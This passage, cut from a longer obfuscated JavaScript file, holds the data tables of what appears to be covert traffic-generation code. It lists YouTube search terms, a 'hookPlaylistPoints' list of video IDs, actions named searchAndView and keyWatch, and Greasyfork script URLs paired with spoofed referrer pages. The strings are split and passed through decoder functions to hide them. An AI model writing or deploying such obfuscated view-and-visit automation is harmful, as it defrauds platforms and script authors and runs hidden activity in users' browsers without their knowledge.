'\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x5f8 * 0x1 + -0x1b69 + 0x216b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xf13 * -0x2 + -0x813 * 0x2 + 0x2e56)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xd69 * 0x1 + 0x676 * -0x1 + 0x4a * -0x18);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    W(0x15, 'Bq1E') + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    Y(0x18) + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    W(0x3, 'RKyz') + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    W(0x16, '^(rf') + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': Y(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': W(0x8, 'l#Ai') + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0x1c) + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + W(0xa, 'txca')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + X(0x13) + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xc, '^(rf') + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0x1c) + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
